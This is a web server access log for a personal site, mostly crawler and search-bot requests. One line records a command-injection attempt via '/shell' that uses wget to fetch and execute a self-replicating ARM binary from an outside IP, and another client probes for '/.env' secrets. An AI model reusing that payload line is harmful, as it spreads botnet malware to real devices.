114.119.147.81 - - [20/Jun/2022:00:40:42 +0000] "GET /node/472?share=facebook HTTP/1.1" 301 178 "https://mrchoke.org/node/472?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:00:40:51 +0000] "GET /node/472/?share=facebook HTTP/1.1" 200 8188 "https://mrchoke.org/node/472?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
223.204.255.137 - - [20/Jun/2022:00:44:18 +0000] "GET /apple-touch-icon-precomposed.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:44:18 +0000] "GET /apple-touch-icon.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:44:18 +0000] "GET /favicon.ico HTTP/2.0" 200 1150 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:44:18 +0000] "GET /apple-touch-icon-precomposed.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:44:18 +0000] "GET /apple-touch-icon.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:44:18 +0000] "GET /favicon.ico HTTP/2.0" 200 1150 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:44:18 +0000] "GET / HTTP/2.0" 200 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
223.204.255.137 - - [20/Jun/2022:00:44:18 +0000] "GET / HTTP/2.0" 200 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
51.222.253.11 - - [20/Jun/2022:00:44:39 +0000] "GET /node/1558/img_7504/ HTTP/2.0" 200 7903 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
223.204.255.137 - - [20/Jun/2022:00:45:03 +0000] "GET / HTTP/2.0" 200 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
223.204.255.137 - - [20/Jun/2022:00:45:03 +0000] "GET /apple-touch-icon-precomposed.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:45:03 +0000] "GET /apple-touch-icon.png HTTP/2.0" 404 123 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
223.204.255.137 - - [20/Jun/2022:00:45:03 +0000] "GET /favicon.ico HTTP/2.0" 200 1150 "-" "com.apple.WebKit.Networking/8614.1.14.0.14 CFNetwork/1378.1 Darwin/22.0.0"
114.119.147.87 - - [20/Jun/2022:00:46:37 +0000] "GET /node/1815/ch7_4338?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/1815/ch7_4338?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [20/Jun/2022:00:46:37 +0000] "GET /node/1815/ch7_4338?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/1815/ch7_4338?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [20/Jun/2022:00:46:37 +0000] "GET /node/1815/ch7_4338/?ak_action=accept_mobile HTTP/1.1" 200 7855 "https://mrchoke.org/node/1815/ch7_4338?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [20/Jun/2022:00:53:04 +0000] "GET /node/342?share=reddit HTTP/1.1" 302 154 "https://mrchoke.org/node/342?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [20/Jun/2022:00:53:09 +0000] "GET /node/342?share=reddit HTTP/1.1" 301 178 "https://mrchoke.org/node/342?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [20/Jun/2022:00:53:10 +0000] "GET /node/342/?share=reddit HTTP/1.1" 200 8055 "https://mrchoke.org/node/342?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [20/Jun/2022:00:56:59 +0000] "GET /node/1657/img_7632?ak_action=reject_mobile HTTP/1.1" 302 154 "http://mrchoke.org/node/1657/img_7632" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [20/Jun/2022:00:57:06 +0000] "GET /node/1657/img_7632?ak_action=reject_mobile HTTP/1.1" 301 178 "http://mrchoke.org/node/1657/img_7632" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [20/Jun/2022:00:57:10 +0000] "GET /node/1657/img_7632/?ak_action=reject_mobile HTTP/1.1" 200 7948 "http://mrchoke.org/node/1657/img_7632" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.5 - - [20/Jun/2022:00:57:43 +0000] "GET /node/1558/img_7525/ HTTP/2.0" 200 7913 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
39.103.239.37 - - [20/Jun/2022:00:58:08 +0000] "GET /shell?cd+/tmp;+wget+http:/\x5C/146.0.75.242/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1" 404 162 "-" "Hello, Momentum"
114.119.147.87 - - [20/Jun/2022:01:06:41 +0000] "GET /node/category/blognone/btd HTTP/1.1" 404 134 "http://www.mrchoke.org/node/28" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [20/Jun/2022:01:07:31 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [20/Jun/2022:01:07:31 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.17 - - [20/Jun/2022:01:10:38 +0000] "GET /img_7517/ HTTP/2.0" 200 7870 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.19 - - [20/Jun/2022:01:10:42 +0000] "GET /wp-content/uploads/2014/02/IMG_7519-150x150.jpg HTTP/2.0" 200 21559 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.17 - - [20/Jun/2022:01:10:44 +0000] "GET /wp-content/uploads/2014/02/IMG_7516-150x150.jpg HTTP/2.0" 200 13280 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.9 - - [20/Jun/2022:01:10:47 +0000] "GET /wp-content/uploads/2014/02/IMG_7517.jpg HTTP/2.0" 200 2120796 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [20/Jun/2022:01:12:13 +0000] "GET /node/86/?share=google-plus-1 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.87 - - [20/Jun/2022:01:12:59 +0000] "GET /node/350?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/350?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:01:13:16 +0000] "GET /node/350?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/350?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:01:13:19 +0000] "GET /node/350?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/350?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:01:13:21 +0000] "GET /node/350/?share=twitter HTTP/1.1" 200 8080 "https://mrchoke.org/node/350?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [20/Jun/2022:01:19:01 +0000] "GET /node/1255/img_6804 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.86 - - [20/Jun/2022:01:19:27 +0000] "GET /node/184?share=facebook HTTP/1.1" 302 154 "https://mrchoke.org/node/184?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [20/Jun/2022:01:19:30 +0000] "GET /node/184?share=facebook HTTP/1.1" 301 178 "https://mrchoke.org/node/184?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [20/Jun/2022:01:19:32 +0000] "GET /node/184/?share=facebook HTTP/1.1" 200 8657 "https://mrchoke.org/node/184?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
202.102.144.122 - - [20/Jun/2022:01:21:47 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 Chrome"
216.244.66.229 - - [20/Jun/2022:01:22:25 +0000] "GET /node/248?share=twitter HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
185.191.171.41 - - [20/Jun/2022:01:23:48 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.19 - - [20/Jun/2022:01:23:49 +0000] "GET /node/453 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.13 - - [20/Jun/2022:01:23:55 +0000] "GET /node/date/2007/03/15/ HTTP/2.0" 200 10568 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.15 - - [20/Jun/2022:01:25:50 +0000] "GET /node/1731/img_7750 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.34 - - [20/Jun/2022:01:25:52 +0000] "GET /node/1731/img_7750/ HTTP/1.1" 200 7870 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.86 - - [20/Jun/2022:01:29:53 +0000] "GET /node/75?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/75?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [20/Jun/2022:01:29:58 +0000] "GET /node/75?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/75?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [20/Jun/2022:01:30:01 +0000] "GET /node/75/?share=linkedin HTTP/1.1" 200 8871 "https://mrchoke.org/node/75?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.79.245 - - [20/Jun/2022:01:31:07 +0000] "GET /node/tag/garmin-thai/ HTTP/1.1" 200 8665 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.175 - - [20/Jun/2022:01:31:08 +0000] "GET /node/142 HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.245 - - [20/Jun/2022:01:31:08 +0000] "GET /node/date/2006/04/page/2/ HTTP/1.1" 200 14849 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.182 - - [20/Jun/2022:01:31:15 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.214 - - [20/Jun/2022:01:31:16 +0000] "GET /node/1657 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.25 - - [20/Jun/2022:01:31:16 +0000] "GET /node/1657 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.28 - - [20/Jun/2022:01:31:17 +0000] "GET /node/1657/ HTTP/1.1" 200 11605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.243 - - [20/Jun/2022:01:31:19 +0000] "GET /wp-includes/css/dist/block-library/style.min.css?ver=5.7.1 HTTP/1.1" 200 58171 "https://static.mrchoke.org/node/1657/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
114.119.147.81 - - [20/Jun/2022:01:32:06 +0000] "GET /node/984/img_6458?share=facebook HTTP/1.1" 302 154 "https://mrchoke.org/node/984/img_6458?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:01:32:09 +0000] "GET /node/984/img_6458?share=facebook HTTP/1.1" 301 178 "https://mrchoke.org/node/984/img_6458?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [20/Jun/2022:01:32:11 +0000] "GET /node/984/img_6458/?share=facebook HTTP/1.1" 200 7888 "https://mrchoke.org/node/984/img_6458?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
23.146.242.137 - - [20/Jun/2022:01:33:03 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.146.242.137 - - [20/Jun/2022:01:33:04 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.146.242.137 - - [20/Jun/2022:01:33:05 +0000] "GET /.env HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
23.146.242.137 - - [20/Jun/2022:01:33:07 +0000] "POST / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.222.253.11 - - [20/Jun/2022:01:37:20 +0000] "GET /node/865/ch7_3230/ HTTP/2.0" 200 7882 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.9 - - [20/Jun/2022:01:40:18 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.1 - - [20/Jun/2022:01:40:19 +0000] "GET /node/232 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.41 - - [20/Jun/2022:01:40:20 +0000] "GET /node/232 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.3 - - [20/Jun/2022:01:40:22 +0000] "GET /node/232/ HTTP/1.1" 200 8481 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.4 - - [20/Jun/2022:01:44:24 +0000] "GET /node/date/2007/05/ HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.44 - - [20/Jun/2022:01:44:25 +0000] "GET /node/date/2007/05/ HTTP/1.1" 200 13306 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
66.249.71.28 - - [20/Jun/2022:01:45:39 +0000] "GET /node/tag/app/ HTTP/1.1" 200 9018 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
114.119.147.87 - - [20/Jun/2022:01:48:46 +0000] "GET /node/date/2006/05 HTTP/1.1" 301 178 "https://mrchoke.org/node/1208/img_6784?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [20/Jun/2022:01:48:47 +0000] "GET /node/date/2006/05/ HTTP/1.1" 200 10841 "https://mrchoke.org/node/1208/img_6784?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
161.97.135.248 - - [20/Jun/2022:01:49:11 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:13 +0000] "GET /node/187/feed HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:15 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:17 +0000] "GET /node/187/feed HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:22 +0000] "GET /node/187/feed/ HTTP/1.1" 403 134 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:24 +0000] "GET /node/187?share=facebook HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:27 +0000] "GET /node/187?share=facebook HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:30 +0000] "GET /node/187/?share=facebook HTTP/1.1" 200 9676 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:34 +0000] "GET /node/187?share=linkedin HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:37 +0000] "GET /node/187?share=linkedin HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:39 +0000] "GET /node/187/?share=linkedin HTTP/1.1" 200 9676 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:42 +0000] "GET /node/187?share=reddit HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:44 +0000] "GET /node/187?share=reddit HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:47 +0000] "GET /node/187/?share=reddit HTTP/1.1" 200 9676 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:51 +0000] "GET /node/187?share=twitter HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:53 +0000] "GET /node/187?share=twitter HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:49:56 +0000] "GET /node/187/?share=twitter HTTP/1.1" 200 9676 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:03 +0000] "GET /node/189 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:06 +0000] "GET /node/189 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:11 +0000] "GET /node/189/ HTTP/1.1" 200 8271 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:16 +0000] "GET /node/189/feed HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:23 +0000] "GET /node/189/feed HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:30 +0000] "GET /node/189/feed/ HTTP/1.1" 403 134 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:34 +0000] "GET /node/189?share=facebook HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:37 +0000] "GET /node/189?share=facebook HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:43 +0000] "GET /node/189/?share=facebook HTTP/1.1" 200 8271 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:47 +0000] "GET /node/189?share=linkedin HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:50 +0000] "GET /node/189?share=linkedin HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:54 +0000] "GET /node/189/?share=linkedin HTTP/1.1" 200 8271 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:50:58 +0000] "GET /node/189?share=reddit HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:51:02 +0000] "GET /node/189?share=reddit HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:51:06 +0000] "GET /node/189/?share=reddit HTTP/1.1" 200 8271 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
161.97.135.248 - - [20/Jun/2022:01:51:14 +0000] "GET /node/189?share=twitter HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
185.191.171.23 - - [20/Jun/2022:01:51:20 +0000] "GET /node/939 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
161.97.135.248 - - [20/Jun/2022:01:51:20 +0000] "GET /node/189?share=twitter HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
185.191.171.33 - - [20/Jun/2022:01:51:21 +0000] "GET /node/939 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
161.97.135.248 - - [20/Jun/2022:01:51:23 +0000] "GET /node/189/?share=twitter HTTP/1.1" 200 8271 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
